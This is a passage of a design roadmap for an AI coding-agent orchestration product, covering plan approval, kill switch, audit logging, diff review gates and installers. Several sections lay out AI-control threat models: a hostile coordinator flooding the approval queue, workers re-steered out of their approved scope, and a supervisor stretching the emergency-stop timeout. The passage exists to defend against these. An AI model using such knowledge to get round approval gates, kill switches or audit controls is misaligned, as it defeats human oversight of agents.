2. Provenance is dual-source: the orchestrator (P2-09/P2-14) **emits Agent Trace records** for every worker session (and writes `Agent:`/`Task:`/`Plan:` trailers as the durable in-history fallback); `ProvenanceReader` consumes trace JSON first, trailers second. Rendering the standard that Cursor/Jules/Amp emit makes external branches (P2-12) attributable too.
3. Cockpit view composes existing controls: T-13 diff rendering, risk ordering, provenance chips, acknowledgment panel; acknowledgments recorded (audited later by P2-15).
4. Wire `FlaggedChangeDetector` output into P2-10's `CanMerge`.
5. **Out-of-approved-Scope detection (OPS SA-1 / F6):** for a managed worker, `FlaggedChangeDetector` also compares the produced diff's touched paths against the worker's approved `TaskPlan.Scope` (P2-14); any file **outside** the approved Scope is a **dedicated must-acknowledge flagged item** (same mechanism as the RT-D2 changed-test-command flag) that blocks `CanMerge` until acknowledged. This closes the gap where a Coordinator `send_worker_prompt` re-steers a running worker off its approved plan and the review surface showed only a diff with no scope-violation signal — plan approval binds to a Scope, so a silent merge of off-Scope work is not allowed.

### Edge-case matrix

| Case | Required behavior |
|---|---|
| dependency bump only | flags `Lockfile`, not `ExecutableConfig` |
| script added to `package.json` | flags `ExecutableConfig`; acknowledgment required |
| commit without trailers (human commit) | provenance chip absent, no crash, rank still applies |
| renamed file with risky content | classified by new path + content |
| acknowledgment then diff changes (new push) | acknowledgments reset (they bind to a diff hash) |

### Invariants (MUST)

1. Classifier/detector/reader are pure and fixture-tested; UI contains no rule logic.
2. Acknowledgments bind to the content hash of the flagged hunk set — any change invalidates them.
3. Risk ordering never hides hunks (ordering only; everything remains reachable).

**Extensions (2026-07-07):** (a) **semantic manifest/lockfile diff** — parse package-lock/pnpm-lock/csproj/poetry.lock deltas in the diff view into an actual dependency delta (added/updated packages, maintainer change, install-scripts present) with a local OSV-database CVE check, feeding the flagged gate — reviewing a 9,000-line lockfile diff is the worst agent-review moment and nobody addresses it; (b) **review-sprint mode** — a timed, keyboard-only pass over the ranked hunks with a per-session risk budget; deferred hunks are recorded as unviewed in the P2-38 coverage map.

**Rejection triggers:** rules implemented in XAML/code-behind; acknowledgment as a single global checkbox.

**Required tests:** classifier fixture corpus (each category + the scripts-vs-bump distinction); trailer parse matrix; acknowledgment-invalidation; end-to-end: poisoned postinstall branch → panel appears → merge blocked until acknowledged (extends the P2-10 canary).

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §6 ("where trust is manufactured").** Risk-ranked hunks, per-hunk provenance chips, the flagged-changes acknowledgment gate, and the test-delta strip are one cockpit surface; state vocabulary and the badge family per §9.

## P2-12 — External agent PR intake (new; market D-1 "vendor-neutral moat")

**Milestone:** M7 (accelerated 2026-07-07: Jules ships a public API + GitHub Action, Codex/Devin PR volume is compounding, and Kepler's PR-based tasks show competitors circling — the vendor-neutral square is still empty) · **Priority:** P0 · **Depends on:** P2-10; reuses T-23 (PR list), T-29 (PR → worktree).

### Why

Teams already run Codex/Jules/Copilot cloud agents that only surface PRs. Subscribing those PRs into the same verify→review→merge pipeline makes Mainguard useful on day one without anyone changing how they run agents — the cheapest wedge in the market research, and one no competitor ships.

### Contract

```csharp
// Mainguard.Agents/Agents/Orchestrator/ExternalPrIntake.cs (daemon)
public sealed record ExternalPrSource(string Host, string Owner, string Repo, string? AuthorFilter); // e.g. bots
public interface IExternalPrIntake
{
    void Subscribe(ExternalPrSource source);
    /// <summary>Poll: new/updated open PRs matching the filter → materialize each as a queue entry
    /// (fetch PR head into the VM bare repo as agent/pr-<n>, worktree, enter MergeQueue at Working).</summary>
    Task PollOnceAsync(CancellationToken ct);
}
```

### Implementation steps

1. Reuse `IPullRequestService` (T-23) for listing; author-filter for known bot accounts (configurable list, e.g. `codex[bot]`, `google-jules[bot]`, `copilot`).
2. Materialize: `git fetch origin pull/<n>/head:agent/pr-<n>` into the VM bare repo (authenticated CLI path), create the worktree, enter the P2-10 queue at `Working` → verification runs exactly as for local agents.
3. Review happens in the P2-11 cockpit; **merge is pushed back through the host PR merge API** (T-23 merge) rather than a local foreground merge — the queue's merge step is pluggable per entry origin.
4. PR updates (new commits) re-enter the queue (stale semantics identical).

### Edge cases / invariants

| Case | Required behavior |
|---|---|
| PR force-pushed | old verification invalidated, re-queued |
| PR closed upstream mid-queue | entry cancelled, worktree pruned |
| same PR subscribed twice | idempotent |
| rate limits | polls go through the host client's typed error path; backoff, never a crash loop |

MUSTs: intake writes nothing to the upstream PR without an explicit user action (review submit / merge click); token usage stays inside the audited T-23 transport.
**Required tests:** fixture-driven poll → queue-entry materialization; force-push invalidation; closed-PR cleanup; merge-path dispatch (local vs host-API) unit-tested.

---

## P2-13 — Activity bar & docking UI (G-7.4)

**Milestone:** M7 · **Priority:** P0 · **Depends on:** P2-02, P2-03.

Contract summary (strategy §G-7.4, binding): `Dock.Avalonia` workspace (Terminal + agent-diff + staging per agent, layout persisted); Activity bar — Row 0: Resource Monitor (VM CPU/RAM sparklines + token-spend counters from `GatewayService`) + pinned tabs incl. Coordinator with `IsAttentionRequired` pulse; Row 1: virtualized LIFO agent list. Status micro-badges via one `AgentStatus → Brush` converter (theme tokens — all five themes). OS notifications on transitions into waiting/blocked (suppressed when foregrounded on that agent). Teardown discipline: `IDisposable` sandbox VMs, timers stopped, floating dock windows closed (documented Dock.Avalonia leak), `WeakReferenceMessenger` only.

**Invariants:** open/close an agent tab 50× → stable heap + zero floating windows (blocking memory test); all colors via design tokens (v1 UI rules apply unchanged).
**Required tests:** status→brush mapping; LIFO ordering; attention derivation; the 50× memory harness; headless PNG of the bar with 4 fake agents in every theme.

**Carried-in from P2-08 (implement here):** the per-day token+cost budget caps already exist and are enforced daemon-side in `BudgetCaps`, but the `GatewayService` `Budget` proto only carries the two per-agent fields — extend it with the per-day fields (additive) so the Resource Monitor / budget-settings surface can display and edit per-day caps over gRPC.

**Carried-in from P2-12 (implement here):** P2-12 built the external-PR-intake engine (`ExternalPrIntake` + `MergeDispatch` + `PrIntakeStore`, with a `MergeQueueRow.Origin` column) and unit-tested it, but left two activation seams for this UI/daemon pass: (a) **expose entry origin over gRPC** — the queue proto still omits `origin`, so the activity list can't yet badge external PR entries as such; add it (additive) alongside the per-day budget fields; (b) **start the poll loop in the daemon** — `ExternalPrIntake.RunAsync(PollInterval)` exists but nothing calls it from a hosted service; wire it into the daemon scheduler here (it belongs with the Resource Monitor / daemon-timer surface). Separately, `PrHeadFetcher` carries a `TODO(P2-12 human-review)` for the private-repo credential injection (git credential env, never argv/URL — mirrors the T-29 checklist); that live slice is exercised by the optional nightly host smoke, not this pass.

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §0 (revision of record) + §2/§4.** The control center is **integrated, not a separate window**: MainWindow keeps its full v1 chrome and gains a leftmost **section rail** (collapsible like the repo sidebar; top third = Repo viewer / Coordinator with attention badge / Resources / the relocated git-host icons; bottom two-thirds = the live agent list; the kill switch at the rail's foot, always visible in every section). **Two layouts only** — Flight Deck (default) and Conversation Deck — picked in File → Layout, persisted as `UserPreferences.WorkspaceLayout`, applying to coordinator surfaces only (the Repo viewer never changes shape). The 2026-07 prototype on `phase2` (Views/ViewModels + mock services) is the reference implementation; its mock services are shaped like the gRPC contract so P2-02's `DaemonClient` swaps in with zero View changes.

## P2-14 — Plan approval + dual-mode orchestration (G-7.5)

**Milestone:** M7 · **Priority:** P0 — the product thesis · **Depends on:** P2-08, P2-09, P2-13.

Contract summary (strategy §G-7.5, binding, with the market promotion of plan-approval into the headline): `CoordinatorAgent` — chat agent with **no code, no worktree, no merges**; tools `spawn_worker(taskSpec)`, `get_worker_status`, `send_worker_prompt`, `request_verification`, capped by limits/budgets/admission. **Two-phase spawn:** structured `TaskPlan { Scope: files[], Approach, TestStrategy }` (JSON-schema validated) → rendered for approval → **workers start only on approved plans**; plan + approver OS identity persisted (P2-15 chains it). **The approver identity is derived daemon-side from the authenticated connection's OS peer credential — NEVER a client-supplied field** (OPS SA-1 / F2: a client-set `osIdentity` would let token-holding host malware forge an attributable approval; deriving it daemon-side at least removes the trivial audit forgery. The residual — host malware running as the user can still drive approvals/merges with a valid token, and can also push directly via T-10 — is the stated host-trust boundary, OPS §1.1; a host-un-forgeable presence factor is deferred, OPS §10.1). Terminal locking for managed workers enforced **daemon-side** (input stream severed at the gRPC layer, not just UI read-only). **Kill switch:** **freeze the merge queue FIRST** (in-proc, instant — reject `BeginMerge`/`ConfirmMerge`/spawn) **before** the yield fan-out, so no merge slips the up-to-ceiling fan-out window (OPS SA-1 / F4), then yield-all (timeout → `docker pause`) + journal snapshot; one always-visible control. Human handoff: `AwaitingReview` badge; merges only via the P2-10 human path. Coordinator serializes dependent tasks; partitioning quality is tracked telemetry.

**Edge cases:** plan rejected → worker never spawns, no worktree residue; kill switch with an agent mid-yield → pause after timeout; manual-mode spawn bypasses coordinator but not admission/budgets.
**Launch-blocker gates (§3.1):** (RT-D4, M7 exit) the kill-switch fan-out and yield-to-pause timeouts take `min(ceiling, max(floor, k×RTT))` with a **fixed absolute ceiling independent of `RttBudget`** — a supervisor-influenced RTT (the OOB channel's RTT is measured over a hop terminating at the untrusted supervisor) can never stretch the emergency stop; `docker pause` needs no supervisor cooperation, so the ceiling only bounds *how long* an agent runs during a kill, not correctness. (RT-D3, M7.5 exit) the kill switch stays non-blocking (freeze-then-audit best-effort); on audit-store recovery the daemon appends a chained `killswitch_audit_gap{killEpochId, observedAt}` so a kill during an audit outage is tamper-evident (P2-15).

**Anti-approval-fatigue (S-8 hardening):** a `PlanPending` plan consumes no admission or budget, so an unbounded number of pending drafts would let a hostile Coordinator flood the human approval queue into rubber-stamping. Cap concurrent `PlanPending` plans per Coordinator and rate-limit `spawn_worker` drafting; surface an "N plans pending" pressure signal; excess draft attempts return `RESOURCE_EXHAUSTED` and are audited.

**Invariants:** input-lock verified at the gRPC layer by test (hand-crafted client rejected); the kill-switch fan-out bound is `min(ceiling, max(5 s, 50×RTT))` — the "< 5 s" figure is the local profile of the RTT-scaled formula, and the absolute ceiling holds regardless of measured RTT; the coordinator cannot invoke merge RPCs (interceptor-enforced role, not convention); pending-plan count per Coordinator is capped.
**Required tests:** spawn-cap/budget rejection; plan schema validation corpus; scripted-coordinator end-to-end (2 independent tasks → parallel workers → verified → sequential human merges with a stale re-verify between); kill-switch fan-out ordering; **`KillSwitchBound_HardCeiling_IndependentOfRtt` (RT-D4); `KillSwitchDuringAuditOutage_ShouldMarkGapOnRecovery` (RT-D3); pending-plan-cap rejection (S-8); `KillSwitch_FreezesQueueBeforeFanOut` (OPS SA-1/F4 — a `BeginMerge` in the fan-out window after `KillSwitch` receipt is rejected `FAILED_PRECONDITION`); `ApproverIdentity_IsDaemonDerived_NotClientField` (OPS SA-1/F2 — a client `osIdentity` field cannot influence the recorded approver)**.

**Carried-in from P2-08 (runnable here, pre-ship):** the P2-08 gateway's deferred **live-model smoke** — one real-provider session under sustained load validating real rate-limit-header behavior and the no-raw-429 path against a live API — becomes runnable once the coordinator drives a real agent end-to-end through the gateway. Run it as a `RequiresNetwork` pre-Alpha check (needs a real key; not a PR gate), before the first external release per §3.2.

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §5.** The coordinator chat, the TaskPlan approval card, and the always-visible kill switch (rail foot, every section per §0) are specified as one surface.

## P2-15 — Tamper-evident audit log (H-8.2, pulled forward)

> **STATUS AS OF 2026-08-11: NOT STARTED.** Verified across every branch. The only implementation of
> `IAuditLog` is `InMemoryAuditLog` — a `List<AuditEvent>` that dies with the process. There is no hash
> chain, no `PrevHash`, no persistence, no `mainguardd audit verify`, and no SIEM export anywhere in the
> tree. `IAuditLog.cs`'s own doc comment still describes this task in the future tense.
>
> **What that costs today, measured:** 28 `IAuditLog.Append` call sites across 13 production files —
> `plan_approved` with the approving identity, `egress_denied`, the kill-switch events, seven in
> `MergeQueue`, eight in `ExternalPrIntake` — and `Read()` has **zero** production callers. No RPC exposes
> it and no ViewModel renders it. Every audit event this product writes is appended to an object nobody
> can read and nothing outlives the daemon process.
>
> The operative rule until this ships, recorded in `IAuditLog.Read`'s doc comment: **an `Append` is never
> the user-visible record of anything.** Every destructive path must pair its audit call with a log line
> or a typed refusal the user actually sees. Three paths added in August 2026 follow that rule; anything
> new must too.
>
> *Recorded because this task was twice believed complete when it was not — once in a deferral note
> ("until P2-15…") that read as though P2-15 were imminent, and once by the owner directly. The doc now
> states the code's actual state so the next reader does not have to re-derive it.*

**Milestone:** M7.5 — target **before 2026-08-02** (EU AI Act enforcement window) · **Priority:** P0 for enterprise, P1 overall · **Depends on:** P2-14 approval records exist; start once P2-10 is merged.

> **Scope split (2026-07-07):** ship the **evidence pack** first — hash chain + authorizing identity + `mainguardd audit verify` + the P2-16 SIEM feed; RFC 3161 external anchoring (step 3) may land as a fast-follow. Claims language is "audit-grade / tamper-evident": Article 12 mandates automatic logging and traceability, **not** cryptography — hash-chaining is the differentiator, not a legal checkbox. Standalone audit vendors (Agent Audit, Asqav, Compliora) prove the demand but none can attribute actual code changes — the Git side is unclaimed.

### Contract

```csharp
// Mainguard.Agents/Audit/HashChain.cs (pure)
public sealed record AuditRecord(long Seq, DateTimeOffset Timestamp, string Type, string PayloadJson, string PrevHash, string Hash);
public static class HashChain
{
    public static string ComputeHash(string prevHash, string canonicalPayload);   // SHA-256(prevHash ‖ payload)
    public static (bool Valid, long? FirstBadSeq) Verify(IEnumerable<AuditRecord> records);
}

// Mainguard.Agents/Audit/AuditLog.cs (daemon)
public interface IAuditLog
{
    long Append(string type, object payload, string osIdentity);   // canonicalizes, chains, persists
    IReadOnlyList<AuditRecord> Read(long fromSeq, int take);
    (bool Valid, long? FirstBadSeq) VerifyAll();
    long Redact(long seq, string reason, string osIdentity);       // new chained event referencing the original's hash — never rewrites
}
```

Event types (minimum): `inference` (model, prompt, output), `agent_spawned`, `agent_stopped`, `plan_approved`, `plan_rejected`, `merge_approved`, `merge_rejected`, `stale_override_used`, `egress_denied`, `budget_exceeded`, `killswitch`, `killswitch_audit_gap` (RT-D3: appended on audit-store recovery when a kill fired while the store was unavailable — the freeze-then-audit carve-out is thereby made tamper-evident rather than silent), `acknowledged_flagged_change`, `redaction`.

### Implementation steps

1. Canonical JSON (sorted keys, invariant culture) → `HashChain.ComputeHash`; SQLite append-only table + an append-only file mirror.
2. Wire `Append` at every Gateway/lifecycle/approval/merge touchpoint (G-17 becomes hash-chained here).
3. **External anchoring:** every N records / 24 h, RFC 3161 timestamp the head hash (`Rfc3161Anchor.cs`); store the TSA token; `mainguardd audit verify` walks the chain + validates anchors.
4. AES-GCM at rest (key in OS keyring), retention default 90 d, redaction as a chained event.
5. Full prompt/output logging is a sensitive store: encryption, retention, and redaction are part of the feature, not afterthoughts (market v2 §6).

### Edge cases / invariants

| Case | Required behavior |
|---|---|
| single-byte tamper anywhere | `VerifyAll` fails at exactly that seq |
| redaction | payload replaced, chain still verifies (redaction event carries the original hash) |
| daemon crash mid-append | no torn record (transactional write); chain resumes |
| TSA unreachable | anchoring queued/retried; log keeps appending (anchoring is best-effort, chaining is not) |

MUSTs: `HashChain` pure + property-tested; no plaintext prompt content on disk outside the encrypted store; every G-17 touchpoint emits exactly one event (idempotence per operation).
**Rejection triggers:** rewriting or deleting records under any code path; hashing non-canonical JSON.
**Required tests:** tamper detection sweep; redaction verifiability; anchor round-trip (network-gated trait); touchpoint coverage test (run a scripted swarm session → assert the expected event sequence).

**Extension (2026-07-07) — merge-decision replay:** `mainguardd audit replay <sha>` re-derives the whole chain for any commit on main — which plan approved it, which agent produced it (P2-43 signature), which verification receipt covered it (P2-42), which human viewed which hunks (P2-38 receipts), chain intact. Pure composition of existing records; the enterprise-closing demo.

---

## P2-16 — SIEM exporter (H-8.3)

> **Builds on the daemon logging pipeline (shipped 2026-07).** The operational per-subsystem logs (`DaemonLogSubsystems`) can later feed CEF/JSON export alongside the P2-15 audit events; a structured/JSON formatter over the existing `SubsystemFileLoggerProvider` categories is the extension. *Not now* — the shipped pipeline stays single-line human-readable.

**Milestone:** M7.5 · **Priority:** P1 (enterprise) · **Depends on:** P2-15.

Contract summary (strategy §H-8.3, binding): `SiemExporter` streaming P2-15 events as CEF/JSON over syslog (TCP/TLS), Splunk HEC, and generic webhook; per-sink config, buffering + retry with a bounded queue, delivery-status panel; event taxonomy documented in `docs/siem-events.md`.

**Invariants:** sink outage → buffered redelivery, zero loss up to the cap, loud state past it; schema-valid JSON (JSON-schema test); 1k events/min load test.
**Required tests:** local syslog container + mock HEC integration; outage/redelivery; schema validation corpus.

---

## P2-17 — Source-available trust architecture + network transparency (H-8.1)

> **Builds on the daemon logging pipeline (shipped 2026-07).** The `Egress` log category (`LoggingTransparencyLog` teeing `INetworkTransparencyLog` into `egress.log`/journal) is a read source for this surface; keep the Egress line schema (`host`/`verdict`/`kind`/`agent`/`bytes`) stable so the transparency view consumes it without a re-parse.

**Milestone:** M7.5 · **Priority:** P0 for enterprise GA (licensing already LOCKED: FSL backend / proprietary GUI+Coordinator) · **Depends on:** P2-07 (proxy logs).

Contract summary (strategy §H-8.1, binding): repo split enforcing the license boundary (daemon + sandbox/worktree engine + adapters → FSL repo publishing NuGet artifacts; GUI/Coordinator/governance stay private and pin versions); published `docs/security-architecture.md` living in the FSL repo next to the code it describes; **network transparency view** — in-app panel streaming every outbound connection from daemon + sandboxes (source = egress proxy logs): destination, agent, bytes, verdict, filterable, exportable; independent security audit commissioned pre-enterprise-GA with a `SECURITY.md` intake.

**Invariants:** license headers/`LICENSE` correct per artifact (CI check); the transparency view shows a live allowed call and a denied attempt within seconds; every doc claim maps to a test or config reference.
**Required tests:** CI license check; proxy-log → view-model streaming integration; doc-claims checklist in the PR.

---

## P2-18 — Terminal target engine: server-side libvterm + Skia grid renderer (G-7.1b)

**Milestone:** M7 (before beta) · **Priority:** P0 · **Depends on:** P2-04 green on the interim engine. **Gate:** P2-04 ≥ parity on libvterm — no golden regression.

Contract summary (strategy §G-7.1b, binding): P/Invoke bindings (`vterm_new`, `vterm_input_write`, screen callbacks incl. `sb_pushline`/`sb_popline`, keyboard encoders); one `VtermSession` per agent PTY owned by the session leader; damage rects coalesced by the 16 ms ticker into `GridUpdate` protos (cell runs: UTF-32 glyph + combining, truecolor fg/bg, attr bitset; cursor; scroll ops first-class); snapshot/attach path (full grid + modes + lazy scrollback) serving crash recovery, reattach, and future cloud; `TerminalGridControl` — first-party Skia cell grid (glyph-run cache, damage-only redraw, selection/clipboard, IME overlay, CJK double-width, mouse/keyboard encoders incl. bracketed paste); engine behind `TerminalEngine=libvterm|interim` flag until P2-04 signs off; linux-x64 `libvterm.so` built in CI from pinned source, daemon-side only.

**Field findings binding on this task (2026-07-22 — the first live coordinator sessions; the coordinator's inline terminal is where most operator time is spent, so these are P0 within P2-18, not nice-to-haves):**

- **Ink/Yoga TUI correctness (the claude-code screen).** The interim `VtScreen` lacks scroll regions (DECSTBM) + origin mode, insert/delete line (CSI L/M) and insert/delete char (CSI @/P), the alternate screen buffer (?1049 and friends), save/restore cursor (DECSC/DECRC, CSI s/u), deferred-wrap (last-column) semantics, and the ED 2/3 erase variants — the observed field failure is content drawn at stale rows, dead fragments left behind after redraws, status lines interleaved into scrollback, and layouts that don't match the pane size. libvterm covers all of this; the P2-04 gate must stay green and a claude-code login → interactive session is part of the manual matrix below.
- **One authoritative grid size.** The size the CLI sees (PTY), the vterm screen size, and the rendered cell grid must never disagree: a layout resize debounces client-side, resizes the PTY (SIGWINCH), and reflows through libvterm — never a client-side reinterpretation of old frames at a new width (a root cause of the interim mis-scaling).
- **Mouse-selection copy is REQUIRED in `TerminalGridControl` v1** (promised to the field 2026-07-22): drag selection with cell-accurate rendered highlight; Ctrl+Shift+C and context-menu copy of the selected text (single spaces between glyph runs, newlines between rows, trailing blanks trimmed); selection survives damage-only redraws; and while the application has mouse tracking enabled, selection requires the standard Shift override instead of stealing the app's mouse events.
- **The interim host-clipboard bridge carries over unchanged:** OSC 52 → host clipboard with queries (`?`) never answered (the jail must not be able to read the host clipboard), and the three paste chords (Ctrl+V / Ctrl+Shift+V / Shift+Insert) with CR normalization + bracketed-paste wrapping. `TerminalClipboardTests` must pass against the new engine as-is.

**Invariants:** kill client mid-`htop` → reattach renders an identical grid; daemon restart with leader alive → live reattach; sustained 50 MB `cat` keeps client CPU bounded with no full-grid sends in steady scroll; Claude Code (login → interactive session → `/status`, the 2026-07-22 field regression) /vim/htop/tmux manual matrix.
**Required tests:** P2-04 suites on this engine (the merge gate); snapshot/attach integration; damage-coalescing perf measurement in the PR; `TerminalClipboardTests` green against the new engine; a selection-copy test (drag → copied text exact, incl. run spacing + row newlines).

---

## P2-19 — Cross-worktree conflict radar (new; market D-5)

**Milestone:** M7.5 · **Priority:** P1 — a visible differentiator no competitor ships · **Depends on:** P2-06 (worktrees), T-02 chunker (already on main).

### Why

GitKraken markets "predictive conflict detection" between *a user's* branches. Nobody watches N live agent worktrees against each other **and** main and warns *before* either merges. Mainguard has every ingredient: the daemon owns all worktrees, and the pure 3-way chunker classifies overlap.

### Contract

```csharp
// daemon Mainguard.Agents/Agents/ConflictRadar.cs
public sealed record OverlapWarning(string AgentA, string AgentB, string Path, bool CertainConflict); // certain = same-line
public interface IConflictRadar
{
    /// <summary>Pairwise diff of live agent branches (and each vs main): file-level overlap
    /// plus line-level certainty via the T-02 chunker on the overlapping files.</summary>
    IReadOnlyList<OverlapWarning> Scan(string repoHash);
    event Action<OverlapWarning>? NewOverlap;    // raised by the scheduled scan on new findings
}
```

### Implementation steps

1. Per scan: `git diff --name-only main...agent/<id>` per branch (CLI, bare repo); file-set intersections per pair → candidate paths.
2. For candidates, run `GenerateMergeChunks(base, oursText, theirsText)` (blob texts from the bare repo) — any `Conflict` chunk ⇒ `CertainConflict = true`; same file, disjoint chunks ⇒ soft warning.
3. Scheduled after each keep-alive rebase cycle (piggyback P2-09's cadence — no extra yields; reads only refs/blobs, never worktree files).
4. Surface: badge on both agent cards (P2-13), a radar panel listing pairs/paths, and a `stale`-style hint in the P2-10 queue ("merging A will conflict B").

### Edge cases / invariants

| Case | Required behavior |
|---|---|
| binary file overlap | file-level warning only, never chunk classification |
| agent branch identical to main | no self-noise |
| 6 agents (15 pairs) on a large repo | scan bounded: name-only diffs first, chunker only on intersections; measured in the PR |
| overlap disappears after a rebase | warning cleared |

MUSTs: radar is read-only (never touches worktrees or locks the index — bare-repo object reads only); pure classification logic separated from the git plumbing for unit tests.
**Rejection triggers:** scanning working trees directly; running chunker on every pair×file without the name-only prefilter.
**Required tests:** fixture bare repo with three branches (certain conflict, same-file-disjoint, no overlap) → exact warning set; clearing on rebase; binary handling.

**Extension (2026-07-07) — symbol-level radar:** upgrade classification from line overlap to **symbol overlap** (tree-sitter parse of touched functions/types): "agent A and agent B are both editing `AuthService.Login` right now." GitKraken's predictive detection is human-branch, line-level, post-hoc; this is live, N-way, and semantic.

---

## P2-20 — Agent commit-stream curation (new; market D-5)

**Milestone:** M7.5 · **Priority:** P1 · **Depends on:** P2-09; reuses T-08 `InteractiveRebaseService` + T-31 conventional-commit builder (both on main).

### Why

Agents produce checkpoint noise ("wip: sync", 40 micro-commits). Reviewers need reviewable history. A one-click "squash agent checkpoints into N reviewable conventional commits" is pure Git surgery — exactly what a wrapper tool cannot build without re-implementing a Git client.

### Contract

```csharp
// Mainguard.Agents/Agents/Orchestrator/CommitCurator.cs
public sealed record CurationPlan(IReadOnlyList<RebaseTodoItem> Todo, string Summary);
public static class CommitCurator     // pure planner; execution goes through IInteractiveRebaseService
{
    /// <summary>Folds wip/checkpoint commits into their nearest meaningful ancestor and rewords
    /// surviving messages to conventional-commit form (via ConventionalCommitBuilder).</summary>
    public static CurationPlan Plan(IReadOnlyList<(string Sha, string Message)> branchCommits, CurationOptions options);
}
```

UI: on an `AwaitingReview` agent branch — "Curate history" preview (before/after commit list) → executes via the existing T-08 engine against the worktree (yielded, P2-09 discipline) → verification re-runs (history rewrite ⇒ stale by definition).

### Edge cases / invariants

| Case | Required behavior |
|---|---|
| branch of only wip commits | single squashed commit with a generated conventional subject |
| merge commit in range | curation refused (same T-08 v1 restriction), typed |
| curation while agent running | blocked — only `AwaitingReview`/paused branches |
| post-curation | P2-10 marks the branch unverified; re-verify before merge |

MUSTs: planner is pure and fixture-tested; execution exclusively via `IInteractiveRebaseService` (no second rebase driver — G-7 heritage); provenance trailers (P2-11) preserved onto squashed results.
**Required tests:** planner fixtures (wip folding, reword mapping, trailer preservation); integration on a fixture worktree branch; staleness handoff.

---

## P2-21 — Installer part 1: diagnostics, OS enablement, payload pipeline (J-1…J-3)

**Milestone:** M7 · **Priority:** P0 for distribution · **Depends on:** P2-05 (shares bootstrap code).

Contract summary (strategy §§J-1–J-3, binding): `SystemDiagnostics` (Win11 x64 build check, WMI virtualization flags, WSL2 state parse, ≥20 GB disk; each check `Pass | Fail(actionable message + doc link)`; hard-stop before any system modification; ARM64 → explicit unsupported gate); unelevated OOBE with UAC only at "Construct Sandbox" (elevated helper relaunch), `Enable-WindowsOptionalFeature` with the raw PowerShell surfaced, reboot-resume via an **elevated Scheduled Task** (never `RunOnce`) + `oobe-state.json`; reproducible `MainguardOS.tar.gz` build (`build/mainguardos/`, versioned `/etc/mainguardos-release`), silent import reusing P2-05, in-place VM upgrade path preserving provisioned repos, documented CVE patch cadence (`docs/mainguardos-updates.md`).

**Invariants:** WSL-status parsers fixture-tested against captured outputs per WSL version; tarball hash-stable given pinned inputs; vN→vN+1 upgrade preserves repos/worktrees (automated test).
**Required tests:** parser fixtures; INI/state-machine units; CI tarball build; VM-snapshot manual matrix in the PR.

---

## P2-22 — Installer part 2: Windows integration, loopback OAuth, adapter channel, teardown (J-4…J-6)

**Milestone:** M7 · **Priority:** P0 · **Depends on:** P2-21.

Contract summary (strategy §§J-4–J-6, binding): Explorer context menus (install-written, uninstall-removed); **RFC 8252 loopback + PKCE** for every token flow (shared `LoopbackOAuthListener`: ephemeral port, `state` validation, single-use, 5-min timeout); `mainguard://` handler for **non-secret deep links only**; **pinned adapter channel** — `adapters.json` manifest (cli → version, install cmd, config shims, health probe) fetched from a Mainguard-owned channel, installed inside the VM at pinned versions, never `@latest`, updated independently of app releases (keeps perpetual-fallback licenses functional — market v2 §5.3); clean uninstall (`--terminate` → poll → `--unregister`, registry/tasks/appdata removal, user repo untouched, optional `mainguard-vm` remote removal).

> **AMENDED BY P2-49 (agent-CLI lifecycle).** §J-5's *permanent* pin — Mainguard's manifest choosing the version forever — is superseded: it would freeze users behind the CLI they'd have without Mainguard, for no offline benefit (these CLIs need a network to function at all), and its sha256 pin never covered the platform binary npm fetches as an `optionalDependency`. P2-49 keeps the machinery and the **no-`@latest`** rejection trigger (every install is still a concrete, recorded version) and moves only *who chooses* the version to the user, protected by no-auto-update + one-click offline revert. Read §J-5 below as amended by P2-49.

**Invariants:** no token ever in a `mainguard://` URL (grep + code-path test); personal distros untouched by uninstall (G-12); pinned adapter unaffected by a breaking upstream release (simulated test) — *see P2-49: this becomes "no upstream release changes an installed CLI without explicit user action; a bad update is revertible offline in one click".*
**Required tests:** PKCE verifier/challenge + state rejection units; manifest schema; adapter pin simulation; uninstall matrix on a machine with a personal distro (manual, evidenced).

---

## P2-23 — Enterprise access & policy: RBAC / SSO / SCIM (H-8.4)

**Milestone:** M8 · **Priority:** P2 (enterprise GA) · **Depends on:** P2-15, P2-16, P2-22 (loopback OAuth infra).

Contract summary (strategy §H-8.4, binding): role → permission set (`spawn_agents`, `approve_plans`, `approve_merges`, `edit_egress`, `edit_budgets`); OIDC SSO (loopback+PKCE) mapping IdP groups→roles; SCIM 2.0 provisioning endpoint; **enforcement in daemon interceptors** (identity on every gRPC call — UI hiding is not enforcement); signed centralized policy doc (model allowlists, egress rules, budgets) fetched and enforced by Gateway + egress configurator.

**Invariants:** a role without `approve_merges` gets `PERMISSION_DENIED` on the merge RPC even from a hand-crafted client; policy updates propagate without daemon restart; SCIM create/deactivate round-trips against a test harness.

---

## P2-24 — Supply-chain & secrets compliance (H-8.5)

**Milestone:** M8 · **Priority:** P2 · **Depends on:** P2-10 (gate UI), P2-01 (`ISecureKeyStore`).

Contract summary (strategy §H-8.5, binding): Vault KV2 + AWS Secrets Manager backends for `ISecureKeyStore` selectable per org policy; **SCA/license gate at `Verified`** — lockfile-delta extraction (npm/pnpm/NuGet) → SPDX license lookup (local database) → copyleft heuristics flag GPL/AGPL as a blocking review category in the P2-11 flagged panel.

**Invariants:** lockfile-delta extraction fixture-tested per ecosystem; an AGPL-introducing agent branch blocks the merge button until acknowledged; Vault round-trip against a dev-mode container.

---

## P2-25 — Cloud worktrees: guardrails now, implementation post-GA (I)

**Milestone:** continuous + M8 · **Priority:** guardrails P0 (they are CI checks), implementation post-desktop-GA (private beta ≤ 2 quarters after — promoted per market v2 §7.1).

Binding now: every proto stays transport-agnostic (G-14); a WAN-latency CI job (`tc netem` 80 ms) runs the P2-14 end-to-end suite once per release; grid protocol + merge-queue RPCs must pass it unchanged. Implementation when scheduled: daemon container image (same binary), mTLS + user auth replacing the session token, per-tenant encryption at rest, `RemoteEnvironment` picker (local VM | cloud), repo sync via `git push mainguard-cloud` over HTTPS (`mainguard-cloud` is the cloud substrate's resolved `SyncRemote.Name` — same quarantine-sync-remote role as WSL2's `mainguard-vm`, per ESC B1 decision SC-2 / P2-06).

**Acceptance:** the unchanged P2-14 suite passing over WAN; terminal echo < 100 ms at 80 ms RTT.

---

## P2-26 — `VibeOrchestrator` engine + stream interception (K-1; UI stays post-v1)

**Milestone:** M8 · **Priority:** P1 (shared architecture — the Coordinator reuses it) · **Depends on:** P2-03, P2-08.

